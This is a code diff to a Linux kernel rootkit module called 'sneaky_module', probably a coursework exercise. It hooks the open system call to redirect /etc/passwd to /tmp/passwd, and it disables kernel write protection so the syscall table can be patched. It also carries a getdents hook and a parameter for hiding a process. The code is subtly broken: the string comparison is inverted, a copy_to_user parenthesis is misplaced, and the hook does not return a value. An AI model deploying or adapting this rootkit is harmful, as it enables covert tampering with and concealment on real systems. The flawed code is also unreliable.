@@ -16,7 +16,8 @@
 #define SNEAKY_PREFIX_SIZE (sizeof(SNEAKY_PREFIX) - 1)
 #define SNEAKY_MODULE "sneaky_module"
 #define SNEAKY_MODULE_SIZE (sizeof(SNEAKY_MODULE) - 1)
-
+#define REAL_PWD "/etc/passwd"
+#define FAKE_PWD "/tmp/passwd"
 #define handle_error(msg)                                                      \
   do {                                                                         \
     perror(msg);                                                               \
@@ -30,7 +31,7 @@ struct linux_dirent {
   char d_name[1];
 };
 
-static char *sneady_pid = "0";
+static char *sneady_pid = "00000000";
 module_param(sneaky_pid, charp,
              S_IWUSR | S_IRUSR | S_IXUSR | S_IRGRP | S_IROTH);
 
@@ -53,8 +54,20 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
 
   printk(KERN_ALERT
          "This guy wants to open /etc/passwd,redirect to /tmp.passwd now...\n");
-  if (strcmp(pathname, REAL_PWD))
-    return original_open(FAKE_OPEN, flags);
+
+  if (strcmp(pathname, REAL_PWD)) {
+    if (copy_to_user(pathname, FAKE_PWD, sizeof(FAKE_PWD)) != 0) {
+      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user1 \n");
+      return -1;
+    }
+    int ori_value = original_open(pathname, flags);
+    if (copy_to_user(pathname, REAL_PWD, sizeof(REAL_PWD) != 0)) {
+      printk(KERN_ALERT "SNEAKY_OPEN:failed to copy_to_user2 \n");
+      return -1;
+    }
+  } else {
+    return original_open(pathname, flags);
+  }
 }
 
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
@@ -117,7 +130,7 @@ static int initialize_sneaky_module(void) {
   struct page *page_ptr;
 
   // See /var/log/syslog for kernel print output
-  printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_ALERT "Sneaky module being loaded.\n");
 
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -144,7 +157,7 @@ static int initialize_sneaky_module(void) {
 static void exit_sneaky_module(void) {
   struct page *page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n");
+  printk(KERN_ALERT "Sneaky module being unloaded.\n");
 
   // Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
